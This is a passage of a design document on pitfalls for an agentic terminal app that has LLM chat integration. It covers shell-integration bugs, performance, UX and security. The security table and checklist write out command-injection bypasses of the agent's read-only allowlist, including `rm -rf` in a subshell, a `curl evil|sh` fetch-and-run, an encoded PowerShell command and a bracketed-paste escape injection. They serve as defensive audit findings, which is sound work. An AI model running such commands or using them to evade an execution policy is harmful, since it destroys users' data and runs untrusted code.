| **Linux / macOS `bash`** | Overwriting `PROMPT_COMMAND` as a plain string when Bash 5.1+ defines `PROMPT_COMMAND` as an **array**, or firing `DEBUG` trap multiple times across compound pipelines | Handle `declare -p PROMPT_COMMAND` array vs scalar preservation cleanly, and guard `DEBUG` preexec with an `__VOX_AT_PROMPT` latch cleared on first sub-command |
| **Nushell (`nu`)** | Generating POSIX `&&`, `||`, `2>&1`, or `$VAR` in agent shell turns (`pty.rs:208`), or losing ANSI color/table structure when wrapping in `to json --raw` | Detect active shell kind in session metadata (`ShellKind` / shell name), surface shell dialect (`pwsh` / `zsh` / `bash` / `nu`) in agent system context, and preserve structured JSON metadata alongside human-readable table rendering |
| **Loquela Chat `@term` Bridge** | Expanding `@term` in `Loquela.tsx:1035` via `desc.replace(/@term/g, ...)` from unredacted `termBridge.blocks` | Parse full `@term(:last\|:failed\|:pinned\|:<sid>#<id>[:L<a>-<b>])?` grammar and resolve exclusively via backend `redacted_context_bundle` + Clavis secret scrubber |

## Performance Traps

Patterns that work on `echo hi` smoke tests but fail under real developer workloads (`cargo build`, `rg`, `pnpm test`, multi-tab agent runs).

| Trap | Symptoms | Prevention | When It Breaks |
|------|----------|------------|----------------|
| **4 KiB unbatched Tauri `emit("vox://term-output")` per PTY `read()`** (`crates/vox-gui/src/commands/pty.rs:229`) | WebView IPC queue saturation, 100% UI main-thread CPU, sluggish typing/scrolling during `cargo build` | Coalesce PTY chunks into ~8–16 ms / 32–64 KiB frames in the Rust forwarder before `app.emit` | >5 MB/s stdout (~1,250 IPC events/sec) |
| **256-slot `broadcast::channel` dropping stream on `Lagged`** (`host.rs:265`, `term_dispatch.rs:252`) | Terminal viewport freezes permanently mid-command with zero error toast | Batch frames, increase ring capacity, and implement client auto-resync (`termSessionAttach`) on `lagged` / `seq` gap | Single burst >1 MiB (e.g., `cargo test` verbose output or `rg` dump) |
| **Full `termSessionAttach` snapshot on every `BlockClosed`** (`TerminalTab.tsx:166`) | Noticeable UI freeze after every command as session ages; multi-MB JSON serialization spike | Stream incremental `BlockOpened` / `OutputAppended` / `BlockClosed` deltas; cap per-block stored text to 256 KiB | >30 blocks or any single block >2 MB output |
| **Unvirtualized `BlockStreamView` DOM + eager `JSON.parse` on every render** (`BlockStreamView.tsx:40-58, 92-112`) | `BlockStreamView` runs `JSON.parse(trimmedOutput)` **twice per block per React render** without memoization and mounts all `<pre>` nodes in DOM | Memoize structured JSON detection per `(block.id, block.status)` with size guard (<64 KiB) and virtualize block cards | >50 blocks or large JSON output (`vox status --json` / `cargo metadata`) |
| **Multiple WebGL2 contexts across many terminal tabs / split panes** | Browser/WebView hits Chromium's 8–16 active WebGL context limit, silently evicting earlier tabs (`webglcontextlost`) | Activate `@xterm/addon-webgl` **only** on currently visible terminal panes; dispose WebGL addon (falling back to DOM/Canvas) when tab is hidden | >8 open terminal tabs or split panes |

## Security Mistakes

Domain-specific security hazards in an agentic terminal with bidirectional LLM chat integration.

| Mistake | Risk | Prevention |
|---------|------|------------|
| **First-word / space-padded substring allowlisting (`allows_agent_command` in `host.rs:76`)** | Critical RCE / workspace destruction: `echo $(rm -rf .)` or ``ls `curl evil\|sh` `` bypasses `L1ReadOnly` completely | Parse shell input into an AST / strict token grammar; reject `$()`, `` ` ``, `;`, `\|`, `&`, `>`, `<()`, `find -exec`, and nested shell invocations unless every sub-node passes `exec-policy.v1.yaml` + `classify_floor` |
| **Allowlisting `pwsh` / `powershell` inside `exec-policy.v1.yaml` without recursive AST inspection** | Policy bypass: `pwsh -Command "Remove-Item -Recurse ..."` or `pwsh -EncodedCommand <b64>` executes arbitrary blocked cmdlets inside an "allowed binary" | Block `-EncodedCommand` / `-ec` unconditionally; recursively run AST policy extraction on `-Command` arguments or remove `pwsh`/`powershell` from `allowed_binaries` |
| **Client-side `@term` & `SendToAgent` bypassing `vox-redact`** (`Loquela.tsx:1035`, `Console.tsx:275`) | High-severity credential exfiltration: `.env` dumps, `Bearer` tokens, and private keys sent straight to external cloud LLM APIs | Route **all** terminal-to-chat / terminal-to-agent context assembly through backend `redacted_context_bundle` + ANSI stripper + Clavis runtime secret value scrubber |
| **Incomplete `vox-redact` regexes (`vox-redact/src/lib.rs:40-64`)** | Leaks macOS `/Users/<user>`, `AIza...`, `hf_...`, `npm_...`, `sk_live_...`, PEM private keys, `postgres://user:pass@`, and ANSI-colored tokens | Strip ANSI CSI/OSC sequences before redaction; add macOS `/Users/`, PEM block, URL basic-auth, modern vendor token prefixes, and exact-match Clavis secret scrubbing |
| **Clipboard / Terminal Paste Injection (Bracketed Paste Escape `ESC [ 201 ~` & ANSI Title RCE)** | Malicious command output or pasted web snippet prematurely closes bracketed paste (`\x1b[201~\ncurl ...#\n`) or injects OSC 52 clipboard writes | Disable `OSC 52` write-without-consent in `xterm.js`, sanitize `\x1b[200~`/`\x1b[201~` and raw `\r`/`\n` in multi-line paste confirmation modals, and warn before pasting multi-line shell commands directly into a live PTY |
| **UI `securityLevel` state disconnected from backend `LocalHost.security_level`** (`Console.tsx:61, 378`) | False sense of security: changing `<select data-testid="term-security-level-select">` in `Console.tsx` only updates React state and `terminalBridge`, **never calling `term.security` RPC on `LocalHost`!** | Persist `securityLevel` and `controlMode` immediately to the session host (`term.security` / `term.control` RPCs) and synchronize UI state from `SessionInfo` on attach/list |

## UX Pitfalls

Common user experience mistakes in Warp-class hybrid block + raw PTY terminals.

| Pitfall | User Impact | Better Approach |
|---------|-------------|-----------------|
| **Dual Split Viewport Confusion (`BlockStreamView` stacked above raw `xterm.js` repeating the same output)** | Users see every command twice (once in a `340px` card list on top, once in raw `xterm` below), wasting 50% of vertical height and confusing where to click or type | Unify into an intentional Warp-class mode architecture: **Block Stream primary view** with automatic **Full-Viewport Raw TTY / Alt-Screen takeover** whenever an interactive TUI (`vim`, `less`, `htop`, `?1049h`) or raw terminal toggle is active |
| **Global single-key shortcuts (`p`, `f`, `a`, `r`) firing when focus is inside `xterm.js` (`Console.tsx:107-169`)** | `onKeyDown` checks `e.target instanceof HTMLInputElement \|\| HTMLTextAreaElement`, which can misfire if focus is on `.xterm` wrapper `div` (`role="application"`), hijacking `p`, `f`, `a`, `r` keystrokes or stealing `Alt+Up`/`Ctrl+L` (clear screen in bash/zsh)! | Scope single-letter block shortcuts strictly to when `BlockStreamView` (or a block card) explicitly holds focus — **never** intercept `Ctrl+L`, `Ctrl+C`, `Ctrl+R`, or printable keys when `xterm.js` has focus |
| **Silent Autopilot → Manual downgrade with no visual cue** | User accidentally taps a key or switches focus, `Autopilot` silently drops to `Manual` (`host.rs:452`), and the agent stalls waiting for co-pilot confirmation without explanation | Emit a `SessionEvent::ControlModeChanged` event from `LocalHost` (syncing backend → GUI pill) with a subtle toast/badge pulse explaining "Manual takeover active — Resume Co-Pilot/Autopilot" |
| **Low-contrast ANSI colors on Roman Scriptorium light marble/parchment** | Standard terminal ANSI yellow (`#E5E510`), cyan (`#11A8CD`), and bright white (`#FFFFFF`) become unreadable ghosts on `#FAF6EE` / `#F5EFE2` Carrara surfaces | Curate dedicated WCAG-verified 16-color ANSI palettes per theme (`arcane` illuminated ink palette with deep ochre/verdigris/crimson/cobalt >= 4.5:1 on `#F5EFE2`, vs `slate` / `high-contrast` dark palettes) |
| **Owned `InputEditor` swallows `Ctrl+C` / `Ctrl+D` / `Tab` needed by running foreground processes** | While `cargo watch` or `python` REPL runs, user presses `Ctrl+C` in `InputEditor` expecting to stop the running command, and nothing happens | When active session has an in-flight `Running` / `AwaitingInput` foreground process, wire `Ctrl+C` (when selection is empty) in `InputEditor` to send `SIGINT` (`\x03`) to the PTY and show a live "Stop (`Ctrl+C`)" button |

## "Looks Done But Isn't" Checklist

Things that appear complete in unit/mock tests but break immediately in real operator sessions.

- [ ] **Stateful Working Directory & Env:** Run `cd crates` then `pwd`, and `export FOO=bar` (or `$env:FOO='bar'`) then `echo $FOO` — verify state persists across consecutive blocks in `pwsh`, `zsh`, `bash`, and `nu`.
- [ ] **Zero-Echo Startup & Clean History:** Open a fresh tab in `zsh`, `bash`, `pwsh`, and `nu` — verify 0 lines of `__VOX_OSC633` / `$global:__VoxOsc633` appear in `xterm` or `replay`, no stray `%` (`PROMPT_SP`) opens a bogus block, and pressing `UpArrow` does not recall the integration snippet.
- [ ] **Real Exit Codes Across All Shells:** Run `false` or `exit 1` (subshell `(exit 42)`) in `zsh`, `bash`, `pwsh`, `fish`, and `nu` — verify `Block.exit_code == 42` and `BlockStatus::Failed` (specifically catching the current `zsh` `__vox_ec=0` bug).
- [ ] **Real PTY Resize (`TIOCSWINSZ` / ConPTY):** Resize the Console split pane and run `tput cols` / `stty size` / `$Host.UI.RawUI.WindowSize` — verify the OS child process sees the new dimensions, not `80x24`.
- [ ] **Split Multi-Byte UTF-8 Fidelity:** Stream box-drawing (`╭───╮`) and 4-byte emoji (`🦀`) split deliberately across 1-byte and 4096-byte chunks — verify zero `` (`U+FFFD`) in both `xterm.js` and `Block.output`.
- [ ] **Alt-Screen Interactive TUI Handshake:** Launch `less`, `vim`, or `git log` — verify `?1049h` switches cleanly to interactive TTY mode (or `PAGER=cat` prevents agent deadlock) and `?1049l` restores block framing cleanly on exit.
- [ ] **End-to-End Security Sync:** Change the Security Level dropdown in `Console.tsx` to `L1 Read-Only` — verify `term.security` RPC actually mutates `LocalHost.security_level` AND rejects `!echo $(rm foo)` and `!find . -delete`.
- [ ] **End-to-End `@term` Redaction:** Echo a fake `sk-...` key, a Clavis-resolved secret, and `/Users/alice/.ssh/id_ed25519` with ANSI color codes in Console, then submit `explain @term:last` and `Send to Agent` — verify the outbound LLM payload contains `[REDACTED_KEY]` and `~[REDACTED_PATH]` with zero raw secret leakage.
- [ ] **Theme Contract & Monospace Cell Grid:** Switch live across `arcane`, `glacier`, `slate`, and `high-contrast` — verify `vox audit code` reports 0 `vox/ui/theme-contract-drift` errors, `xterm` renders in a true fixed-width font (not `Palatino`), `.xterm-helper-textarea` is invisible, and every ANSI color meets ≥ 4.5:1 contrast.

## Recovery Strategies

When pitfalls occur in live sessions despite prevention, how the system and operator recover without losing work.

| Pitfall | Recovery Cost | Recovery Steps |
|---------|---------------|----------------|
| **Broadcast `RecvError::Lagged` or sequence gap during massive stdout burst** | LOW | Frontend detects `lagged` event or `payload.seq > expectedSeq`, calls `term.reset()`, fetches fresh `termSessionAttach(sid)` snapshot (`replay` + `blocks`), and resumes live streaming from `snap.seq` |
| **Interactive command (`npm init` / `less` / password prompt) stalls agent loop** | LOW | Stall detector transitions block to `AwaitingInput` after idle threshold; agent turn parks cleanly with actionable status; operator either types into live PTY, clicks `Send Ctrl+C` (`SIGINT`), or promotes to background |
| **Corrupted terminal VT state (catting `/dev/urandom` or broken alt-screen exit)** | LOW | Expose `/reset` slash command & toolbar button that sends RIS (`\x1bc` + `\x1b[?1049l`), calls `term.reset()` on `xterm.js`, and re-emits a fresh shell prompt without killing shell CWD/env |
| **WebGL2 context loss (`webglcontextlost`) under GPU sleep or multi-tab pressure** | LOW | Real `@xterm/addon-webgl` `onContextLoss` handler disposes the WebGL addon immediately, allowing `xterm.js` to fall back seamlessly to its built-in Canvas/DOM renderer without dropping session state |
| **Orphaned daemon PTY sessions accumulating memory** | MEDIUM | Enforce idle-reaper TTL / max-retained-sessions policy in `vox-orchestrator-d` `LocalHost`, plus explicit `termSessionClose` button (`×`) on every session tab in `Console.tsx` (currently missing!) |

## Pitfall-to-Phase Mapping

How Milestone v7.5 (`axis-warp-terminal-v75`) roadmap phases must sequence and verify prevention of every pitfall.

| Pitfall | Prevention Phase | Verification |
|---------|------------------|--------------|
| **Pitfall 1:** Stateless `run_shell_capture` split-brain, `replay_utf8` duplication loop, & no-op `PtyHandle::resize` | **Phase 1: Stateful PTY Engine & Unified Session Lifecycle** | Integration test asserting `cd` + env persistence across `submit()`, `tput cols` reflecting `resize()`, and single-write attach semantics in `TerminalTab` |
| **Pitfall 2:** Stdin hook echo spam, `zsh` `PROMPT_SP` / `$?==0` bug, & ConPTY startup races | **Phase 1: Zero-Echo Cross-Platform Shell Integration (`pwsh`, `zsh`, `bash`, `fish`, `nu`)** | Per-shell PTY harness tests verifying 0 hook lines in `replay`, accurate non-zero exit codes in `zsh`/`bash`/`pwsh`/`nu`, and clean `PROMPT_SP` handling |
| **Pitfall 3:** UTF-8 multi-byte chunk splitting (`U+FFFD`) & `Replay` mid-sequence slicing | **Phase 2: Lossless Byte-Stream Transport & Stateful OSC-633/UTF-8 Framing** | Property-based chunk-splitting tests (1..4096 byte splits over box-drawing + emoji + OSC 633 markers) + ring-buffer boundary eviction tests |
| **Pitfall 7 (Transport):** `RecvError::Lagged` stream death & unbounded `Block` IPC payloads | **Phase 2: Coalesced Frame Streaming, Lag Resync & Bounded Block Store** | High-throughput stress test (`10 MB` burst) verifying zero stream freeze, bounded IPC JSON size, and automatic `lagged` resync |
| **Pitfall 6:** Substring `allows_agent_command` bypasses, UI-backend security desync, & unredacted `@term` leaks | **Phase 3: AST-Enforced Terminal Security Gate & Clavis-Aware Context Redaction** | Adversarial bypass corpus (`$()`, backticks, `\|`, `pwsh -c`, `find -delete`) + E2E redaction test covering `@term:*`, `SendToAgent`, ANSI-wrapped tokens, `/Users/`, and Clavis secrets |
| **Pitfall 4:** Pager/prompt/daemon deadlocks in Agent/Chat tool execution | **Phase 4: Bidirectional Chat ↔ Terminal Harness, Stall Detection & Background Promotion** | Automated tests for `PAGER=cat`, `?1049h` alt-screen detection, `AwaitingInput` transition on interactive prompt, `SIGINT` cancellation, and dev-server backgrounding |
| **Pitfall 5:** `Palatino` `--font-mono` grid breakage, fake WebGL stub, `.xterm-helper-textarea` & `.text-brass` CSS bleed | **Phase 5: Roman Scriptorium Console Surface, Monospace Grid Isolation & Theme Palettes** | `vox audit code` (`0` drift errors) + Playwright computed-style assertions across all 4 themes verifying fixed-width `xterm` cell metrics, invisible helper textarea, and ≥ 4.5:1 ANSI contrast |
| **Pitfall 7 (Visual):** Blinking cursors, shimmer animations, & `isMock` divergence breaking CV convergence | **Phase 6: Real-`xterm` Playwright Harness & Deterministic CV Flywheel Convergence** | Back-to-back multi-theme screenshot stability check (`0.00%` idle pixel jitter) against live `xterm.js` canvas + full `BlockStreamView` |

## Sources

- **In-Repo Terminal Core Audit:**
  - [pty.rs](file:///Users/brbrainerd/dev/vox/crates/vox-terminal-core/src/pty.rs) — `ZSH_OSC633` (`L62-L79`), `run_shell_capture` (`L181-L205`), no-op `PtyHandle::resize` (`L319-L324`), stdin snippet injection (`L368-L372`), 4096-byte reader (`L380-L390`)
  - [osc633.rs](file:///Users/brbrainerd/dev/vox/crates/vox-terminal-core/src/osc633.rs) — `String::from_utf8_lossy` chunk conversion (`L84`, `L112`, `L146`)
  - [session.rs](file:///Users/brbrainerd/dev/vox/crates/vox-terminal-core/src/session.rs) — stateless `submit_with_origin` (`L75-L181`), unbounded `blocks: Vec<Block>` (`L25`)
  - [host.rs](file:///Users/brbrainerd/dev/vox/crates/vox-terminal-core/src/host.rs) — naive `TermSecurityLevel::allows_agent_command` (`L76-L145`), byte-naive `Replay` drain (`L274-L278`), `broadcast::channel(256)` (`L265`)
  - [daemon_host.rs](file:///Users/brbrainerd/dev/vox/crates/vox-terminal-core/src/daemon_host.rs) — `route` terminating pump on `lagged` (`L171`)
- **In-Repo Daemon, Security & Redaction Audit:**
  - [term_dispatch.rs](file:///Users/brbrainerd/dev/vox/crates/vox-orchestrator-d/src/term_dispatch.rs) — `spawn_blocking` submit without timeout/SIGINT (`L71`, `L173`), `RecvError::Lagged` closing stream (`L252-L266`)
  - [exec-policy.v1.yaml](file:///Users/brbrainerd/dev/vox/contracts/terminal/exec-policy.v1.yaml) & [check_terminal.rs](file:///Users/brbrainerd/dev/vox/crates/vox-cli-research/src/check_terminal.rs) — `pwsh`/`powershell` in `allowed_binaries` (`L25-L26`) and PowerShell AST extractor (`L28-L69`)
  - [floor.rs](file:///Users/brbrainerd/dev/vox/crates/vox-orchestrator/src/oversight/floor.rs) — `classify_floor` lexical scope notes (`L24-L28`) and `command_rewrites_history` (`L400-L501`)
  - [lib.rs (vox-redact)](file:///Users/brbrainerd/dev/vox/crates/vox-redact/src/lib.rs) — `re_home` missing macOS `/Users/` (`L40-L45`) and `re_token` patterns (`L47-L64`)
- **In-Repo GUI, Theme Contract & Chat Bridge Audit:**
  - [pty.rs (vox-gui)](file:///Users/brbrainerd/dev/vox/crates/vox-gui/src/commands/pty.rs) — per-chunk `from_utf8_lossy` (`L59`, `L151`, `L227`) and forwarder abort/re-spawn (`L213-L243`)
  - [TerminalTab.tsx](file:///Users/brbrainerd/dev/vox/crates/vox-gui/ui/src/components/surfaces/Console/TerminalTab.tsx) — `replay_utf8` re-injection on `pendingLine` (`L203-L215`), `BlockClosed` full re-attach (`L163-L168`), `isMock` divergence (`L228-L270`), dark-on-dark `text-brass` (`L250`)
  - [Console.tsx](file:///Users/brbrainerd/dev/vox/crates/vox-gui/ui/src/components/surfaces/Console/Console.tsx) — hardcoded `80x24` open (`L188`, `L203`), global `keydown` hijacking (`L106-L173`), unredacted `SendToAgent` (`L249`, `L275`), unsynced `securityLevel` select (`L374-L386`)
  - [webglAddon.ts](file:///Users/brbrainerd/dev/vox/crates/vox-gui/ui/src/components/surfaces/Console/webglAddon.ts) — detached `<canvas>` stub (`L19-L35`)
  - [Loquela.tsx](file:///Users/brbrainerd/dev/vox/crates/vox-gui/ui/src/components/surfaces/Loquela/Loquela.tsx) — unredacted client-side `@term` expansion & broken regex (`L1035-L1048`)
  - [index.css](file:///Users/brbrainerd/dev/vox/crates/vox-gui/ui/src/index.css) — `--font-mono` `Palatino` remap (`L21`, `L467-L478`), `main textarea` override (`L689-L695`), `.text-brass` `#1C140C !important` (`L806-L809`)
  - [ui_theme_contract.rs](file:///Users/brbrainerd/dev/vox/crates/vox-code-audit/src/detectors/ui_theme_contract.rs) & [themeContract.ts](file:///Users/brbrainerd/dev/vox/crates/vox-gui/ui/src/lib/themeContract.ts) — banned font literals (`L36-L47`) and dark-hex enforcement (`L9-L34`)

---
*Pitfalls research for: Milestone v7.5 (`axis-warp-terminal-v75` — Roman Scriptorium Warp-Class Agentic Terminal, Stateful PTY Engine, Bidirectional Chat Harness & CV Flywheel Convergence)*
*Researched: 2026-11-14*
